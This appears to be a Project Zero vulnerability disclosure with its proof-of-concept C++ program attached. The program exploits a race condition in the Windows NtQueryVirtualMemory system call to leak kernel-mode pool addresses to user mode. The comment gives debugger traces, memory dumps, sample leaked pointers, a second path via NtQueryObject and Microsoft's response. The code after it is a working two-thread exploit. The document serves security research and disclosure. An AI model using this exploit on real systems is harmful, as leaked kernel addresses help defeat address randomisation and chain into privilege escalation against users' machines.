@@ -1,0 +1,156 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1456
+
+We have discovered that it is possible to disclose addresses of kernel-mode Paged Pool allocations via a race-condition in the implementation of the NtQueryVirtualMemory system call (information class 2, MemoryMappedFilenameInformation). The vulnerability affects Windows 7 to 10, 32-bit and 64-bit.
+
+The output buffer for this information class is a UNICODE_STRING structure followed by the actual filename string. The output data is copied back to user-mode memory under the following stack trace (on Windows 7 64-bit):
+
+--- cut ---
+  kd> k
+   # Child-SP          RetAddr           Call Site
+  00 fffff880`03cfd8c8 fffff800`02970229 nt!memcpy+0x3
+  01 fffff880`03cfd8d0 fffff800`02970752 nt!IopQueryNameInternal+0x289
+  02 fffff880`03cfd970 fffff800`02967bb4 nt!IopQueryName+0x26
+  03 fffff880`03cfd9c0 fffff800`0296a80d nt!ObpQueryNameString+0xb0
+  04 fffff880`03cfdac0 fffff800`0268d093 nt!NtQueryVirtualMemory+0x5fb
+  05 fffff880`03cfdbb0 00000000`772abf6a nt!KiSystemServiceCopyEnd+0x13
+--- cut ---
+
+An example of an output region is shown below:
+
+--- cut ---
+  kd> db rdx rdx+r8-1
+  fffff8a0`01a78010  2e 00 30 00 00 00 00 00-20 80 a7 01 a0 f8 ff ff  ..0..... .......
+  fffff8a0`01a78020  5c 00 44 00 65 00 76 00-69 00 63 00 65 00 5c 00  \.D.e.v.i.c.e.\.
+  fffff8a0`01a78030  48 00 61 00 72 00 64 00-64 00 69 00 73 00 6b 00  H.a.r.d.d.i.s.k.
+  fffff8a0`01a78040  56 00 6f 00 6c 00 75 00-6d 00 65 00 32 00 00 00  V.o.l.u.m.e.2...
+--- cut ---
+
+Here, we can observe a kernel-mode address (fffff8a0`01a78020) of the textual string that follows the UNICODE_STRING, at offset 0x8. This means that the entire original kernel-mode structure is copied to ring-3, and then later the client's UNICODE_STRING.Buffer pointer is fixed up to point into the userland string. This condition could be referred to as a "double write" (as opposed to double fetch), where the kernel first copies some sensitive/confidential data into user-mode, and later overwrites it with legitimate output. Due to the synchronous way applications interact with the system, the clients only see the end result and therefore cannot observe the information disclosure that takes place in the meantime. However, it is possible to exploit the race condition if one is aware of the existence of such a bug.
+
+In order to obtain the leaked kernel pointer, we must read it in between the two writes. This is easiest achieved by running two concurrent threads (on a multi-core machine) -- one continuously invoking the affected NtQueryVirtualMemory syscall, and the other reading the UNICODE_STRING.Buffer member in a loop and checking if it's a kernel-mode pointer. This scheme is implemented in the attached proof-of-concept program. An example output from Windows 7 64-bit is as follows:
+
+--- cut ---
+  C:\>NtQueryVirtualMemory.exe
+  Leaked pointer: fffff8a0014b2010
+  Leaked pointer: fffff8a0014f5010
+  Leaked pointer: fffff8a00153b010
+  Leaked pointer: fffff8a001567010
+  Leaked pointer: fffff8a0015b1010
+  Leaked pointer: fffff8a0015c9010
+  Leaked pointer: fffff8a0015dc010
+  Leaked pointer: fffff8a0015f9010
+  Leaked pointer: fffff8a0017ff010
+  Leaked pointer: fffff8a00180b010
+  Leaked pointer: fffff8a001810010
+  Leaked pointer: fffff8a001832010
+  Leaked pointer: fffff8a001833010
+  Leaked pointer: fffff8a00182a010
+  [...]
+--- cut ---
+
+################################################################################
+
+Update: The insecure behavior of nt!IopQueryNameInternal can be also reached via nt!NtQueryObject. See the following stack trace:
+
+--- cut ---
+  kd> k
+   # Child-SP          RetAddr           Call Site
+  00 fffff880`025548a8 fffff800`02970229 nt!memcpy+0x3
+  01 fffff880`025548b0 fffff800`02970752 nt!IopQueryNameInternal+0x289
+  02 fffff880`02554950 fffff800`02967bb4 nt!IopQueryName+0x26
+  03 fffff880`025549a0 fffff800`02971f7d nt!ObpQueryNameString+0xb0
+  04 fffff880`02554aa0 fffff800`0268d093 nt!NtQueryObject+0x1c7
+  05 fffff880`02554bb0 00000000`772abe3a nt!KiSystemServiceCopyEnd+0x13
+--- cut ---
+
+And the region being copied:
+
+--- cut ---
+  kd> db rdx rdx+r8-1
+  fffff8a0`01666bf0  2e 00 30 00 00 00 00 00-00 6c 66 01 a0 f8 ff ff  ..0......lf.....
+  fffff8a0`01666c00  5c 00 44 00 65 00 76 00-69 00 63 00 65 00 5c 00  \.D.e.v.i.c.e.\.
+  fffff8a0`01666c10  48 00 61 00 72 00 64 00-64 00 69 00 73 00 6b 00  H.a.r.d.d.i.s.k.
+  fffff8a0`01666c20  56 00 6f 00 6c 00 75 00-6d 00 65 00 32 00 00 00  V.o.l.u.m.e.2...
+--- cut ---
+
+Note the kernel-mode address fffff8a0`01666c00 at offset 0x8 of the memory dump.
+
+################################################################################
+
+MSRC have responded that their current policy with regards to addressing kernel pool pointer leaks is as follows:
+
+--- cut ---
+Please note that due to some By-Design kernel pointer leaks already present in our platforms, Information Disclosures which only disclose kernel pool pointers will only be serviced in v.Next until all by design disclosures can be resolved. Information Disclosures of uninitialized kernel memory will continue to be serviced via Security Updates. Any leaks within privileged processes will also be considered v.Next; unless you can supply PoC which proves that you can perform the same leak - but not kernel pool pointer leaks - as an unprivileged user.
+--- cut ---
+
+As this particular bug only facilitates the disclosure of kernel pool pointers, it was classified as a v.Next issue (fixed in a future version of Windows) and closed on the MSRC side. I'm therefore derestricting the details of the bug here, too.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+namespace globals {
+  BYTE OutputBuffer[1024];
+}  // namespace globals
+
+typedef enum _MEMORY_INFORMATION_CLASS {
+  MemoryMappedFilenameInformation = 2
+} MEMORY_INFORMATION_CLASS;
+
+extern "C"
+NTSTATUS NTAPI NtQueryVirtualMemory(
+  _In_      HANDLE                   ProcessHandle,
+  _In_opt_  PVOID                    BaseAddress,
+  _In_      MEMORY_INFORMATION_CLASS MemoryInformationClass,
+  _Out_     PVOID                    MemoryInformation,
+  _In_      SIZE_T                   MemoryInformationLength,
+  _Out_opt_ PSIZE_T                  ReturnLength
+);
+
+BOOL IsKernelPointer(ULONG_PTR Pointer) {
+#ifdef _WIN64
+  return (Pointer >= 0xfff8000000000000);
+#else  // 32-bit
+  return (Pointer >= 0x80000000);
+#endif
+}
+
+DWORD WINAPI ThreadProc(
+  _In_ LPVOID lpParameter
+) {
+  PUNICODE_STRING OutputString = (PUNICODE_STRING)globals::OutputBuffer;
+  ULONG_PTR LastPointer = 0;
+
+  while (1) {
+    ULONG_PTR Pointer = 0;
+    memcpy(&Pointer, &OutputString->Buffer, sizeof(ULONG_PTR));
+    if (IsKernelPointer(Pointer) && Pointer != LastPointer) {
+      printf("Leaked pointer: %Ix\n", Pointer);
+      LastPointer = Pointer;
+    }
+  }
+  return 0;
+}
+
+int main() {
+  CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
+
+  while (1) {
+    SIZE_T ReturnLength;
+    NTSTATUS st = NtQueryVirtualMemory(GetCurrentProcess(),
+                                       &main,
+                                       MemoryMappedFilenameInformation,
+                                       globals::OutputBuffer,
+                                       sizeof(globals::OutputBuffer),
+                                       &ReturnLength);
+
+    if (!NT_SUCCESS(st)) {
+      printf("NtQueryVirtualMemory failed, %x\n", st);
+      ExitProcess(1);
+    }
+  }
+
+  return 0;
+}
